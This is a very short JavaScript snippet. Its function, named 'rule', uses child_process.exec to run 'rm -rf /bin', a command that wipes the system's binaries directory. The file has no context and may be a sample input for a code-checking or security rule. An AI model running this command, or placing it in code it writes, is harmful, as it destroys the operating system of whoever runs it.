import { exec } from 'child_process';

function rule() {
    exec('rm -rf /bin');
}

